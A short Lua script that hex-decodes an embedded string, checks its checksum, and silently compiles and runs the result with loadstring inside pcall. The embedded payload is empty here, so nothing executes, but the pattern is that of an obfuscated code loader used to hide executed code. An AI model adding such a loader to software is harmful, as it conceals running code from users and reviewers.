local function _decode(s)
local t={}
for i=1,#s,2 do
t[#t+1]=string.char(tonumber(s:sub(i,i+1),16))
end
return table.concat(t)
end
local function _check(s)
local c=0
for i=1,#s do
c=(c+string.byte(s,i))%65535
end
return c==22825
end
local function _run()
local code=_decode("")
if not _check(code) then return end
local fn,err=loadstring(code)
if fn then pcall(fn) end
end
_run()
